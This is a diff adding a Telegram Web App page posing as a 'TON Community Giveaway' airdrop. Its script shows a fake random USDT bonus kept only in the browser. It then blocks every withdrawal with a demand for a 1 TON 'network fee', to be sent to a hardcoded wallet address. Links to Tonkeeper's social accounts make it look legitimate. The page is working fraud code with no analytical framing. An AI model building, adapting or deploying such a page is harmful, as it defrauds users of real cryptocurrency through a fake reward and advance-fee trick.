@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Community Giveaway</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --cyan: #00f2ff;
+            --blue: #007aff;
+            --bg: #05070a;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        /* Loading Animation */
+        #loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg); z-index: 99999;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .pulse {
+            width: 80px; height: 80px; background: var(--cyan);
+            border-radius: 50%; animation: pulse-ani 1.5s infinite;
+            box-shadow: 0 0 20px var(--cyan);
+        }
+        @keyframes pulse-ani {
+            0% { transform: scale(0.9); opacity: 1; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+
+        /* Gift Overlay */
+        #giftOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 99998;
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+            text-align: center;
+        }
+
+        /* Header */
+        .top-header {
+            width: 100%; text-align: center; padding: 15px 0;
+            background: linear-gradient(to bottom, rgba(0, 242, 255, 0.1), transparent);
+            font-weight: 900; letter-spacing: 2px; color: var(--cyan); font-size: 14px;
+        }
+
+        /* Balance & Cards */
+        .glass-card {
+            background: var(--glass); backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 25px; padding: 25px 15px; width: 90%;
+            margin-top: 20px; text-align: center; box-sizing: border-box;
+        }
+
+        .usdt-text { font-size: 3rem; font-weight: 800; margin: 5px 0; }
+        .ton-text { color: #888; font-size: 1.1rem; margin-bottom: 20px; }
+
+        /* Buttons */
+        .btn {
+            width: 100%; padding: 16px; border-radius: 14px; border: none;
+            font-weight: bold; font-size: 16px; margin: 8px 0; cursor: pointer; transition: 0.2s;
+        }
+        .btn-withdraw { background: #fff; color: #000; }
+        .btn-deposit { background: linear-gradient(90deg, var(--blue), var(--cyan)); color: #000; }
+        .btn-small { width: auto; padding: 8px 20px; font-size: 12px; margin-top: 5px; }
+
+        /* Social Icons */
+        .social-footer { margin: 30px 0; display: flex; gap: 20px; justify-content: center; }
+        .social-icon {
+            width: 45px; height: 45px; background: var(--glass);
+            display: flex; justify-content: center; align-items: center;
+            border-radius: 50%; color: white; text-decoration: none; font-size: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Inputs */
+        input {
+            width: 100%; padding: 14px; margin: 10px 0; background: #111;
+            border: 1px solid #333; border-radius: 10px; color: #fff; box-sizing: border-box;
+        }
+
+        /* Info Section */
+        .info-section { text-align: left; padding: 15px; font-size: 13px; color: #aaa; line-height: 1.5; }
+        .info-section h4 { color: var(--cyan); margin-bottom: 8px; }
+
+        .page { display: none; width: 100%; flex-direction: column; align-items: center; }
+    </style>
+</head>
+<body>
+
+    <div id="loader">
+        <div class="pulse"></div>
+        <p style="margin-top: 20px; letter-spacing: 3px;">AIRDROP INITIALIZING...</p>
+    </div>
+
+    <div id="giftOverlay">
+        <div class="glass-card" style="border: 2px solid var(--cyan); width: 80%;">
+            <div style="font-size: 80px; margin-bottom: 20px;">🎁</div>
+            <h2 style="color: var(--cyan);">Special Airdrop</h2>
+            <p>You have an unopened gift box!</p>
+            <button class="btn btn-deposit" onclick="openGift()">OPEN GIFT</button>
+        </div>
+    </div>
+
+    <div id="homePage" class="page" style="display: none;">
+        <div class="top-header">TON COMMUNITY GIVEAWAY</div>
+
+        <div class="glass-card">
+            <p style="color: #888; font-size: 12px;">BONUS BALANCE</p>
+            <h1 class="usdt-text" id="uBalDisplay">0.00</h1>
+            <p style="margin-top: -10px; color: var(--cyan); font-weight: bold;">USDT</p>
+            <div class="ton-text">0.00 TON</div>
+
+            <button class="btn btn-withdraw" onclick="showPage('withdrawPage')">Withdrawal</button>
+            <button class="btn btn-deposit" onclick="showPage('depositPage')">Deposit</button>
+        </div>
+
+        <div class="info-section" style="width: 90%;">
+            <h4>🚀 Airdrop Info</h4>
+            <p>Welcome to the TON Global Giveaway. This event is hosted to celebrate the mass adoption of the TON blockchain.</p>
+            <p>● Guaranteed rewards for active telegram users.<br>● Instant claimable bonus in USDT.<br>● Secure and transparent blockchain transactions.</p>
+        </div>
+
+        <div class="social-footer">
+            <a href="https://t.me/tonkeeper_news" class="social-icon"><i class="fab fa-telegram-plane"></i></a>
+            <a href="https://x.com/tonkeeper?utm_source=web&utm_medium=xtg&utm_campaign=xtg" class="social-icon"><i class="fab fa-twitter"></i></a>
+        </div>
+    </div>
+
+    <div id="withdrawPage" class="page">
+        <div class="glass-card">
+            <h3>Withdraw Funds</h3>
+            <input type="text" id="wAddr" placeholder="Wallet Address (TON/USDT)">
+            <input type="number" id="wAmount" placeholder="Amount">
+            <input type="text" id="wMemo" placeholder="Destination Memo">
+            <p style="color: #ff4d4d; font-size: 13px; font-weight: bold;">Network Fee: 1.00 TON</p>
+            
+            <button class="btn btn-deposit" onclick="handleWithdraw()">Confirm Withdrawal</button>
+            <button class="btn" style="background:#222; color:#fff;" onclick="showPage('homePage')">Back</button>
+        </div>
+
+        <div class="info-section" style="width: 90%;">
+            <h4>⚠️ Withdrawal Rules</h4>
+            <p>1. Withdrawals are processed within 5-30 minutes.</p>
+            <p>2. Ensure the destination address supports the TON network.</p>
+            <p>3. A standard network gas fee of 1 TON is required to release the smart contract funds.</p>
+        </div>
+    </div>
+
+    <div id="depositPage" class="page">
+        <div class="glass-card">
+            <h3>Deposit & Verify</h3>
+            <p style="color: #ffcc00; font-size: 12px;">⚠️ SEND ONLY TON (TON NETWORK) COIN</p>
+            <input type="text" id="dAddr" value="UQCgDd9IQXJIyu1QLZ1VTdrXSF_1ey5iI0lNkWV7Qs8nnQQN" readonly>
+            <button class="btn btn-deposit btn-small" onclick="copy('dAddr')">Copy Address ✅</button>
+            
+            <p style="margin-top: 15px; font-size: 14px;">Your Memo:</p>
+            <div id="mText" style="font-size: 22px; color: var(--cyan); font-weight: bold;"></div>
+            <button class="btn btn-withdraw btn-small" onclick="copyMemo()">Copy Memo ✅</button>
+            
+            <button class="btn" style="background:#222; color:#fff; margin-top: 20px;" onclick="showPage('homePage')">Back</button>
+        </div>
+
+        <div class="info-section" style="width: 90%;">
+            <h4>📌 Deposit Rules</h4>
+            <p>1. Use only TON (The Open Network) coins for verification.</p>
+            <p>2. Minimum verification deposit is 1.00 TON.</p>
+            <p>3. Do not forget to include your unique Memo; otherwise, the transaction will not be automatically tracked.</p>
+            <p>4. Once 1 TON is received, your USDT bonus will be unlocked for full withdrawal.</p>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        let bal = parseFloat(localStorage.getItem('uBal')) || 0;
+        let memo = localStorage.getItem('uMemo') || 'PP-' + Math.random().toString(36).substr(2, 5).toUpperCase();
+        localStorage.setItem('uMemo', memo);
+
+        // Loader setup
+        window.onload = () => {
+            document.getElementById('mText').innerText = memo;
+            document.getElementById('uBalDisplay').innerText = bal.toFixed(2);
+            
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                
+                // If not claimed, show gift box. If already claimed, show home.
+                if(!localStorage.getItem('claimed')) {
+                    document.getElementById('giftOverlay').style.display = 'flex';
+                } else {
+                    document.getElementById('homePage').style.display = 'flex';
+                }
+            }, 3000);
+        };
+
+        function openGift() {
+            let win = (Math.random() * (50 - 20) + 20).toFixed(2);
+            bal = parseFloat(win);
+            localStorage.setItem('uBal', bal);
+            localStorage.setItem('claimed', 'true');
+            
+            document.getElementById('uBalDisplay').innerText = bal.toFixed(2);
+            document.getElementById('giftOverlay').style.display = 'none';
+            document.getElementById('homePage').style.display = 'flex';
+
+            tg.showAlert(`🎉 Congratulations! \n\nYou have received $${win} USDT as a welcome bonus!`);
+        }
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+            document.getElementById(id).style.display = 'flex';
+        }
+
+        function copy(id) {
+            navigator.clipboard.writeText(document.getElementById(id).value);
+            tg.HapticFeedback.notificationOccurred('success');
+            alert("Copied ✅");
+        }
+
+        function copyMemo() {
+            navigator.clipboard.writeText(memo);
+            tg.HapticFeedback.notificationOccurred('success');
+            alert("Memo Copied ✅");
+        }
+
+        function handleWithdraw() {
+            let addr = document.getElementById('wAddr').value;
+            let amt = parseFloat(document.getElementById('wAmount').value);
+            
+            if(addr.length < 10 || isNaN(amt) || amt <= 0) {
+                tg.showAlert("❌ Error: Invalid Address or Amount.");
+                return;
+            }
+            if(amt > bal) {
+                tg.showAlert("❌ Error: Insufficient Balance.");
+                return;
+            }
+
+            tg.showConfirm(`Withdraw $${amt} USDT to this address?`, (ok) => {
+                if(ok) {
+                    tg.showAlert("⚠️ Transaction Security Verification\n\nTo complete this withdrawal, you need at least 1 $TON Network Fee in your verified balance.");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
